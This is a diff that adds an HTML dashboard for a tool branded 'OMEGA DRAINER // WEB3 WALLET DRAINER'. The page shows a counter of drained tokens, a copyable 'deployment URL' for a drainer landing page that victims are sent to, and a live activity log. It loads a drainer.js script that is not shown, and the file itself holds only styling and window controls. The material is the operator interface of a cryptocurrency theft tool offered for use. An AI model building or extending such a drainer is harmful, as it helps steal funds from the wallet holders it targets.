@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OMEGA DRAINER // WEB3 WALLET DRAINER</title>
+    <link rel="stylesheet" href="window-controls.css">
+    <script src="window-controls.js"></script>
+    <!-- Using cdnjs for better reliability -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+    <style>
+        :root {
+            --bg-color: #000000;
+            --card-bg: #111111;
+            --border-color: #333333;
+            --text-primary: #ffffff;
+            --text-secondary: #aaaaaa;
+            --accent-color: #ffffff;
+            --radius: 16px;
+        }
+
+        body {
+            background-color: var(--bg-color) !important;
+            color: var(--text-primary) !important;
+            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+        }
+
+        /* Fixed Title Bar - Container */
+        .title-bar {
+            height: 48px;
+            background: rgba(0, 0, 0, 0.9);
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 20px;
+            z-index: 9999;
+            /* Absolute top */
+            position: relative;
+            -webkit-app-region: drag;
+            /* Default drag */
+        }
+
+        .brand-logo {
+            font-weight: 700;
+            font-size: 14px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            color: #fff;
+            pointer-events: none;
+            /* Let drag pass through */
+        }
+
+        /* Window Controls - Explicitly clickable */
+        .window-controls {
+            -webkit-app-region: no-drag !important;
+            /* Force no-drag */
+            display: flex;
+            gap: 8px;
+            /* Slightly tighter gap */
+            z-index: 10000;
+            padding-right: 12px;
+            /* Move left a bit from the edge */
+        }
+
+        .window-controls button {
+            -webkit-app-region: no-drag !important;
+            opacity: 1 !important;
+            /* Force visible */
+            background: rgba(255, 255, 255, 0.15);
+            /* Visible background */
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            /* Visible border */
+            color: #ffffff !important;
+            cursor: pointer !important;
+
+            /* Uniform Size & Centering */
+            width: 32px;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+
+            border-radius: 4px;
+            transition: all 0.2s;
+            pointer-events: auto;
+        }
+
+        .window-controls button:hover {
+            opacity: 1;
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        .main-content {
+            flex: 1;
+            padding: 30px;
+            overflow-y: auto;
+            max-width: 900px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius);
+            padding: 30px;
+            margin-bottom: 24px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+        }
+
+        h2 {
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--text-secondary);
+            margin: 0 0 20px 0;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        .stat-display {
+            display: flex;
+            align-items: baseline;
+            gap: 10px;
+        }
+
+        .stat-value {
+            font-size: 56px;
+            font-weight: 700;
+            letter-spacing: -2px;
+            color: #fff;
+            text-shadow: 0 0 30px rgba(255, 255, 255, 0.2);
+        }
+
+        .stat-label {
+            font-size: 16px;
+            font-weight: 500;
+            color: var(--text-secondary);
+        }
+
+        .status-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 6px 12px;
+            background: #222;
+            border: 1px solid #333;
+            border-radius: 100px;
+            font-size: 12px;
+            font-weight: 500;
+            color: #fff;
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            background: #4ade80;
+            border-radius: 50%;
+            box-shadow: 0 0 8px #4ade80;
+        }
+
+        .input-group {
+            display: flex;
+            background: #000;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 4px;
+        }
+
+        .form-input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            color: #fff;
+            padding: 12px;
+            font-family: 'SF Mono', 'Monaco', 'Consolas', monospace;
+            font-size: 13px;
+        }
+
+        .form-input:focus {
+            outline: none;
+        }
+
+        .btn-copy {
+            background: #fff;
+            color: #000;
+            border: none;
+            border-radius: 6px;
+            padding: 0 20px;
+            font-weight: 700;
+            font-size: 12px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .btn-copy:hover {
+            transform: scale(1.02);
+        }
+
+        .btn-copy:active {
+            transform: scale(0.98);
+        }
+
+        .log-panel {
+            background: #000;
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            height: 300px;
+            padding: 20px;
+            font-family: 'SF Mono', 'Monaco', 'Consolas', monospace;
+            font-size: 12px;
+            overflow-y: auto;
+        }
+
+        .log-entry {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid #1a1a1a;
+        }
+
+        .log-success {
+            color: #fff;
+            font-weight: 500;
+        }
+
+        .log-time {
+            color: #555;
+        }
+
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: transparent;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #333;
+            border-radius: 3px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="title-bar window-drag-region">
+        <div class="brand-logo">DRAINER_PRO // OMEGA NETWORK</div>
+        <!-- Window Controls -->
+        <div class="window-controls">
+            <button onclick="minimizeWindow()" style="font-size:16px;font-weight:bold;">_</button>
+            <button onclick="maximizeWindow()" style="font-size:16px;font-weight:bold;">□</button>
+            <button onclick="closeWindow()" style="font-size:16px;font-weight:bold;">✕</button>
+        </div>
+    </div>
+
+    <div class="main-content">
+
+        <!-- Stats Card -->
+        <div class="card">
+            <h2>Total Value Secured</h2>
+            <div class="stat-display">
+                <span id="totalDrained" class="stat-value">0.0000</span>
+                <span class="stat-label">tOMEGA</span>
+            </div>
+
+            <div style="margin-top: 24px; display: flex; align-items: center; justify-content: space-between;">
+                <div class="status-badge">
+                    <div class="status-dot"></div>
+                    MONITORING NETWORK
+                </div>
+                <!-- RESTORED: This element was causing the JS error -->
+                <div style="font-size: 10px; color: #444; font-family: monospace;">
+                    TARGET: <span id="contractDisplay">loading...</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Deployment URL -->
+        <div class="card">
+            <h2>Deployment URL</h2>
+            <div class="input-group">
+                <input type="text" class="form-input" value="http://localhost:5500/drainer-landing.html" readonly>
+                <button class="btn-copy">COPY</button>
+            </div>
+        </div>
+
+        <!-- Live Feed -->
+        <div class="card" style="flex: 1; margin-bottom: 0px; display: flex; flex-direction: column;">
+            <h2>Live Activity</h2>
+            <div id="logPanel" class="log-panel">
+                <div class="log-entry">
+                    <span class="log-time">SYSTEM</span>
+                    <span>Initializing monitoring daemon...</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="drainer.js"></script>
+    <script>
+        // Window Controls Logic
+        async function minimizeWindow() {
+            if (window.electronAPI) {
+                const id = await window.electronAPI.getWindowId();
+                window.electronAPI.appWindowMinimize(id);
+            }
+        }
+
+        async function maximizeWindow() {
+            if (window.electronAPI) {
+                const id = await window.electronAPI.getWindowId();
+                window.electronAPI.appWindowMaximize(id);
+            }
+        }
+
+        async function closeWindow() {
+            if (window.electronAPI) {
+                const id = await window.electronAPI.getWindowId();
+                window.electronAPI.appWindowClose(id);
+            }
+        }
+    </script>
+</body>
+
+</html>
